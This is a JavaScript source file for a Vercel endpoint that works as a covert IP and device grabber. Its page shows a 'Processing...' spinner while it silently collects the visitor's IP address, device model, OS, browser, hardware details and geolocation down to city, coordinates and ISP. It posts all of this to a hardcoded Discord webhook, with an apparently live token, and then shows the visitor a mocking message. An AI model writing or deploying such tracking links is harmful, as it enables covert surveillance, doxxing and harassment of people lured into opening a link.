// File: api/index.js
// Deploy ke Vercel - satu file saja, tanpa HTML terpisah

export default async function handler(req, res) {
  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5';
  
  // Ambil IP dari Vercel
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() 
    || req.socket.remoteAddress 
    || 'unknown';
  
  // === KIRIM HTML + JAVASCRIPT KE BROWSER ===
  res.setHeader('Content-Type', 'text/html');
  res.status(200).send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Processing...</title>
  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.37/src/ua-parser.min.js"></script>
  <style>
    body {
      background: #0a0a0f;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      font-family: 'Courier New', monospace;
      margin: 0;
      padding: 20px;
    }
    .container {
      text-align: center;
      max-width: 90%;
    }
    .spinner {
      width: 40px;
      height: 40px;
      border: 2px solid #1e1e2e;
      border-top: 2px solid #00e5ff;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin: 0 auto 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .text {
      color: #00e5ff;
      font-size: 12px;
      letter-spacing: 2px;
    }
    pre {
      background: #111118;
      padding: 20px;
      border-radius: 8px;
      border: 1px solid #1e1e2e;
      color: #00e5ff;
      font-family: monospace;
      font-size: 14px;
      text-align: left;
      overflow-x: auto;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="spinner"></div>
    <div class="text">MENDETEKSI PERANGKAT...</div>
  </div>

  <script>
    (async function() {
      const DISCORD_WEBHOOK = '${DISCORD_WEBHOOK}';
      const IP_FROM_SERVER = '${ip}';
      
      // === DETEKSI DEVICE REAL DARI BROWSER ===
      const parser = new UAParser();
      const r = parser.getResult();
      
      const ua = navigator.userAgent;
      
      // Ambil model real (sama persis seperti deviceinfo.me)
      let deviceModel = r.device.model || 'Unknown';
      let deviceBrand = r.device.vendor || 'Unknown';
      let deviceType = r.device.type || 'desktop';
      
      // Fallback untuk Android (ambil dari string Build/)
      if (deviceModel === 'Unknown' || deviceModel === null) {
        const modelMatch = ua.match(/\\(Linux.*?;\\s([^;]+?)\\sBuild\\//);
        if (modelMatch) deviceModel = modelMatch[1];
      }
      
      // Ambil info OS
      const osName = r.os.name || 'Unknown';
      const osVersion = r.os.version || '';
      const osDisplay = osName + (osVersion ? ' ' + osVersion : '');
      
      // Ambil info Browser
      const browserName = r.browser.name || 'Unknown';
      const browserVersion = r.browser.version || '';
      const browserDisplay = browserName + (browserVersion ? ' ' + browserVersion : '');
      
      // Ambil info CPU
      const cpuCores = navigator.hardwareConcurrency || 'Unknown';
      
      // Ambil info RAM
      const ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown';
      
      // Ambil info Screen
      const screenRes = screen.width && screen.height ? screen.width + ' × ' + screen.height + ' px' : 'Unknown';
      const dpr = window.devicePixelRatio || 'Unknown';
      
      // Ambil info Touchscreen
      const touchScreen = navigator.maxTouchPoints > 0 ? 'Yes (' + navigator.maxTouchPoints + ' points)' : 'No';
      
      // Ambil info Language
      const language = navigator.language || 'Unknown';
      
      // === AMBIL IP DAN LOKASI dari ipwho.is ===
      let ipAddress = IP_FROM_SERVER;
      let locationData = null;
      
      try {
        // Coba ambil IP publik dari browser juga
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        if (ipData.ip) ipAddress = ipData.ip;
      } catch (err) {
        console.log('Gagal ambil IP dari ipify');
      }
      
      // Ambil info lokasi dari ipwho.is
      let locationText = '';
      let flagEmoji = '';
      let country = '';
      let city = '';
      let region = '';
      let lat = '';
      let lon = '';
      let isp = '';
      
      try {
        const geoRes = await fetch(\`https://ipwho.is/\${ipAddress}\`);
        const geoData = await geoRes.json();
        if (geoData.success) {
          flagEmoji = geoData.flag?.emoji || '';
          country = geoData.country || 'Unknown';
          city = geoData.city || 'Unknown';
          region = geoData.region || 'Unknown';
          lat = geoData.latitude || '?';
          lon = geoData.longitude || '?';
          isp = geoData.connection?.isp || 'Unknown';
          locationData = geoData;
        }
      } catch (err) {
        console.log('Gagal ambil lokasi');
      }
      
      // === KIRIM SEMUA INFO KE DISCORD ===
      const discordMessage = {
        content: \`**🔔 ADA YANG BUKA LINK!**\n\n` +
          \`**🌐 IP:** \\\`\${ipAddress}\\\`\n` +
          \`**📱 Device Type:** \${deviceType.charAt(0).toUpperCase() + deviceType.slice(1)}\n` +
          \`**🏭 Device Brand:** \${deviceBrand}\n` +
          \`**📲 Device Model (Real):** \\\`\${deviceModel}\\\`\n` +
          \`**💻 Operating System:** \${osDisplay}\n` +
          \`**🌍 Browser:** \${browserDisplay}\n` +
          \`**🖥️ Screen:** \${screenRes} (DPR: \${dpr}x)\n` +
          \`**🧠 CPU Cores:** \${cpuCores !== 'Unknown' ? cpuCores + ' cores' : 'Unknown'}\n` +
          \`**💾 RAM:** \${ram}\n` +
          \`**🖱️ Touchscreen:** \${touchScreen}\n` +
          \`**🌐 Language:** \${language}\n` +
          \`**🕒 Waktu:** \${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n\n` +
          \`**📍 LOKASI (ipwho.is):**\n` +
          \`🇮🇩 Negara: \${country} \${flagEmoji}\n` +
          \`🗺️ Region: \${region}\n` +
          \`🏙️ Kota: \${city}\n` +
          \`📌 Koordinat: \${lat}, \${lon}\n` +
          \`🌍 ISP: \${isp}\n\n` +
          \`**📱 USER AGENT RAW:**\n\\\`\\\`\\\`\n\${ua}\n\\\`\\\`\\\`\`
      };
      
      try {
        await fetch(DISCORD_WEBHOOK, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(discordMessage)
        });
      } catch (err) {
        console.error('Discord error:', err);
      }
      
      // === TAMPILKAN JSON "SIRI JELEK CUY" ===
      document.body.innerHTML = \`
        <div class="container">
          <pre>{
  "message": "SIRI NO TAHI WWKWKW",
  "status": "ok",
  "timestamp": "\${new Date().toISOString()}"
}</pre>
        </div>
      \`;
    })();
  </script>
</body>
</html>
  `);
}
